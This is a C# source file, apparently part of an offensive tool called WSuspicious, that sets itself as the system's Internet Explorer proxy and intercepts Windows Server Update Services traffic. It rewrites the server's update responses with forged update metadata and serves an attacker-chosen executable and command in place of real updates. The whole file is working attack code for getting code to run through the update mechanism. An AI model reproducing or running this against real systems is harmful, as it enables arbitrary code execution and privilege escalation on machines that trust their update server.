using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;
using System.Xml.Linq;
using Titanium.Web.Proxy;
using Titanium.Web.Proxy.EventArguments;
using Titanium.Web.Proxy.Exceptions;
using Titanium.Web.Proxy.Models;

namespace WSuspicious.Proxy
{
    class WsusProxy : IDisposable
    {
        private readonly SemaphoreSlim @lock = new SemaphoreSlim(1);
        private readonly ProxyServer proxyServer;
        private ExplicitProxyEndPoint explicitEndPoint;
        private InternetExplorerProxyManager proxyManager;

        private short flagStep = 0;

        private readonly byte[] payload;
        private readonly string payloadSHA1;
        private readonly string payloadSHA256;
        private readonly string payloadExecutableName;

        private readonly int updateID1;
        private readonly int updateID2;
        private readonly int deploymentID1;
        private readonly int deploymentID2;
        private readonly string uuid1;
        private readonly string uuid2;

        private readonly bool isDebug;
        private readonly bool isHTTPS;
        private readonly string wsusHost;

        private readonly string executedCommand;

        public WsusProxy(string wsusHost, bool isHTTPS, byte[] payload, string payloadExecutableName, string executedCommand) : this(wsusHost, isHTTPS, payload, payloadExecutableName, executedCommand, false)
        { }

        public WsusProxy(string wsusHost, bool isHTTPS, byte[] payload, string payloadExecutableName, string executedCommand, bool debug)
        {
            this.isDebug = debug;
            this.isHTTPS = isHTTPS;
            this.wsusHost = wsusHost;
            this.payload = payload;
            this.payloadExecutableName = payloadExecutableName;
            this.executedCommand = WebUtility.HtmlEncode(WebUtility.HtmlEncode(executedCommand));
            
            using (var cryptoProvider = new SHA1CryptoServiceProvider())
            {
                this.payloadSHA1 = Convert.ToBase64String(cryptoProvider.ComputeHash(payload));
            }

            using (var cryptoProvider = new SHA256CryptoServiceProvider())
            {
                this.payloadSHA256 = Convert.ToBase64String(cryptoProvider.ComputeHash(payload));
            }

            // Generate our update IDs
            Random rnd = new Random();
            this.updateID1 = rnd.Next(900000, 999999);
            this.updateID2 = rnd.Next(900000, 999999);
            this.deploymentID1 = rnd.Next(80000, 99999);
            this.deploymentID2 = rnd.Next(80000, 99999);
            this.uuid1 = Guid.NewGuid().ToString();
            this.uuid2 = Guid.NewGuid().ToString();

            // Setup the proxy
            proxyServer = new ProxyServer(false, false, false);
            proxyServer.CertificateManager.CertificateStorage = new InMemoryCertificateCache();

            // Silent all exceptions and ensure we never crash and cause DoS
            proxyServer.ExceptionFunc = async exception =>
            {
                if (exception is ProxyHttpException phex)
                {
                    await writeToConsole(exception.Message + ": " + phex.InnerException?.Message, ConsoleColor.Red);
                }
                else
                {
                    await writeToConsole(exception.ToString(), ConsoleColor.Red);
                }
            };

            proxyServer.ReuseSocket = false;
            proxyServer.EnableConnectionPool = false;

            //TODO: Make proxy aware
            proxyServer.ForwardToUpstreamGateway = false;

            proxyManager = new InternetExplorerProxyManager();
        }

        public void Start(int listenPort)
        {
            proxyServer.BeforeRequest += onRequest;
            proxyServer.BeforeResponse += onResponse;

            //proxyServer.EnableWinAuth = true;

            explicitEndPoint = new ExplicitProxyEndPoint(IPAddress.Loopback, listenPort);

            // Fired when a CONNECT request is received
            explicitEndPoint.BeforeTunnelConnectRequest += onBeforeTunnelConnectRequest;

            // An explicit endpoint is where the client knows about the existence of a proxy
            // So client sends request in a proxy friendly manner
            proxyServer.AddEndPoint(explicitEndPoint);
            proxyServer.Start();
        
            foreach (var endPoint in proxyServer.ProxyEndPoints)
            {
                Console.WriteLine("Listening on '{0}' endpoint at Ip {1} and port: {2} ", endPoint.GetType().Name,
                    endPoint.IpAddress, endPoint.Port);
            }

            // Set us as the new proxy
            proxyManager.setProxy("127.0.0.1", listenPort);
        }

        public void Stop()
        {
            explicitEndPoint.BeforeTunnelConnectRequest -= onBeforeTunnelConnectRequest;

            proxyServer.BeforeRequest -= onRequest;
            proxyServer.BeforeResponse -= onResponse;

            proxyServer.Stop();

            proxyManager.revert();
        }

        public void Dispose()
        {
            Stop();
        }

        private async Task onBeforeTunnelConnectRequest(object sender, TunnelConnectSessionEventArgs e)
        {
            string hostname = e.HttpClient.Request.RequestUri.Host;
            await writeDebugToConsole("Tunnel to: " + hostname);

            var clientLocalIp = e.ClientLocalEndPoint.Address;
            if (!clientLocalIp.Equals(IPAddress.Loopback) && !clientLocalIp.Equals(IPAddress.IPv6Loopback))
            {
                e.HttpClient.UpStreamEndPoint = new IPEndPoint(clientLocalIp, 0);
            }

            e.DecryptSsl = false;
        }

        // intercept & cancel redirect or update requests
        private async Task onRequest(object sender, SessionEventArgs e)
        {
            var clientLocalIp = e.ClientLocalEndPoint.Address;
            if (!clientLocalIp.Equals(IPAddress.Loopback) && !clientLocalIp.Equals(IPAddress.IPv6Loopback))
            {
                e.HttpClient.UpStreamEndPoint = new IPEndPoint(clientLocalIp, 0);
            }

            string hostname = e.HttpClient.Request.RequestUri.Host;

            await writeDebugToConsole("Active Client Connections:" + ((ProxyServer)sender).ClientConnectionCount);
            await writeDebugToConsole(e.HttpClient.Request.Url);

            // We inject into the WSUS dance
            if (hostname.Contains(wsusHost))
            {
                if (e.HttpClient.Request.HasBody)
                {
                    string requestBody = await e.GetRequestBodyAsString();

                    if (requestBody.Contains("<InstalledNonLeafUpdateIDs>") && !requestBody.Contains("<HardwareIDs>"))
                    {
                        await writeToConsole("---- Got request for stage 1 ----");
                        flagStep = 1;
                    }
                    else if (requestBody.Contains("<revisionIDs>"))
                    {
                        await writeToConsole("---- Got request for stage 2 ----");
                        flagStep = 2;
                    }
                }
                else if (e.HttpClient.Request.RequestUri.AbsoluteUri.Contains(".exe"))
                {
                    // return file
                    e.Ok(payload);
                }
            }
        }
        
        private async Task onResponse(object sender, SessionEventArgs e)
        {
            await writeDebugToConsole("Active Server Connections:" + ((ProxyServer)sender).ServerConnectionCount);

            string hostname = e.HttpClient.Request.RequestUri.Host;
            if (hostname.Contains(wsusHost))
            {
                byte[] bodyBytes = await e.GetResponseBody();

                if (bodyBytes.Length > 0)
                {
                    if (flagStep == 1)
                    {
                        using (Stream stream = new MemoryStream(bodyBytes))
                        {
                            XDocument doc = XDocument.Load(stream);

                            var syncUpdatesResult = from p in doc.Descendants()
                                                where p.Name.LocalName == "SyncUpdatesResult"
                                                select p;

                            if (syncUpdatesResult.Count() > 0 && e.HttpClient.Response.StatusCode == (int)HttpStatusCode.OK)
                            {
                                var ns = syncUpdatesResult.First().GetDefaultNamespace();

                                string newUpdatesTemplate = ResourceHandler.NewUpdatesTemplate.Trim();
                                newUpdatesTemplate = String.Format(newUpdatesTemplate, updateID1, deploymentID1, uuid1, uuid2, updateID2, deploymentID2, uuid2);

                                // If there are real Update or OutOfScopeRevisionIDs tags, delete the node
                                doc.Descendants(ns + "NewUpdates").Remove();
                                doc.Descendants(ns + "ChangedUpdates").Remove();
                                doc.Descendants(ns + "OutOfScopeRevisionIDs").Remove();

                                XElement importedNewUpdatesNode = XElement.Parse(newUpdatesTemplate);
                                doc.Descendants(ns + "SyncUpdatesResult").FirstOrDefault().AddFirst(importedNewUpdatesNode);

                                // Small hack to handle the namespace during the XML merges above
                                string returnedBody = doc.ToString(SaveOptions.DisableFormatting).Replace("<NewUpdates xmlns=\"\">", "<NewUpdates>");
                                
                                e.SetResponseBodyString(returnedBody);

                                await writeToConsole("---- First stage on the way ----");
                            }
                        }

                        flagStep = 0;
                    }
                    else if (flagStep == 2)
                    {
                        List<HttpHeader> soapActionHeaders = e.HttpClient.Request.Headers.GetHeaders("SOAPAction");

                        if (soapActionHeaders.Count > 0 && soapActionHeaders[0].Value.Contains("GetExtendedUpdateInfo"))
                        {
                            string payloadURL = "http://wsusisagoldmine:8530/Content/B2/FB0A150601470195C47B4E8D87FCB3F50292BEB2.exe";
                            string secondPhaseTemplate = ResourceHandler.ExtendedUpdateInfoTemplate;
                            secondPhaseTemplate = String.Format(secondPhaseTemplate,
                                updateID2,
                                payload.Length,
                                payload.Length,
                                WebUtility.HtmlEncode(payloadSHA1),
                                WebUtility.HtmlEncode(payloadExecutableName),
                                payload.Length,
                                WebUtility.HtmlEncode(payloadSHA256),
                                executedCommand,
                                WebUtility.HtmlEncode(payloadExecutableName),
                                updateID1,
                                updateID1,
                                updateID2,
                                payloadSHA1,
                                payloadURL
                            );

                            // TODO: I do not know if that works
                            if (e.HttpClient.Response.StatusCode == 500)
                            {
                                e.HttpClient.Response.StatusCode = 200;
                                e.HttpClient.Response.StatusDescription = "OK";
                            }

                            e.SetResponseBodyString(secondPhaseTemplate);

                            await writeToConsole("---- Second stage on the way ----");
                        }

                        flagStep = 0;
                    }
                }
            }
        }

        private async Task writeDebugToConsole(string message, ConsoleColor? consoleColor = null)
        {
            if (this.isDebug)
            {
                await writeToConsole(message, consoleColor);
            }
        }

        private async Task writeToConsole(string message, ConsoleColor? consoleColor = null)
        {
            await @lock.WaitAsync();

            if (consoleColor.HasValue)
            {
                ConsoleColor existing = Console.ForegroundColor;
                Console.ForegroundColor = consoleColor.Value;
                Console.WriteLine(message);
                Console.ForegroundColor = existing;
            }
            else
            {
                Console.WriteLine(message);
            }

            @lock.Release();
        }
    }
}
